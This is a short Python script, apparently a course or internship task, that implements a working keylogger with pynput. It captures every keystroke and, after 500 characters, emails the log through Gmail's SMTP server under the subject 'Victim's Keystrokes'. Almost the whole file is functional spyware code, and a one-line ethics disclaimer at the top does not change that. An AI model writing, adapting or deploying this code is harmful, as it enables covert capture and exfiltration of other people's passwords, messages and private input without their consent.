# Task 04 : A simple keylogger
'''
Create a basic keylogger program
that records and logs keystrokes.
Focus on logging the keys pressed
and saving them to a file. Note:
Ethical considerations and
permissions are crucial for
projects involving keyloggers.
'''

# Library for controlling input streams 
import pynput.keyboard as pk

# Library to send the script over the email
import smtplib 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

log_key = ''

def GetKey(key):
    global log_key
    try: 
        log_key += key.char 
    except AttributeError: 
        if key == pk.Key.space: log_key += ' '
        else: log_key = log_key + ' < ' + str(key) + ' > '

    # Check if the accumulated keystrokes reach 500, then send an email. Change this number as you like
    if len(log_key) >= 500:
        SendMail(log_key)
        log_key = ""  # Reset keystrokes after sending the email
        
def SendMail(content):
    
    from_email = "ENTER_YOUR_EMAIL_HERE@gmail.com"
    to_email = "ENTER_YOUR_EMAIL_HERE@gmail.com"
    password = 'PASSWORD'
    
    msg= MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Victim's Keystrokes"
    msg.attach(MIMEText(content, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)

    server.sendmail(from_email, to_email, msg.as_string())

    server.quit()
    

# Every time a keyboard strok is clicked, call the GetKey function
keyStroke = pk.Listener(on_press=GetKey)

# the with block both starts the listener and keeps your program alive (via join()), and it ensures the listener is cleaned up when you exit the block.
with keyStroke:
    keyStroke.join()
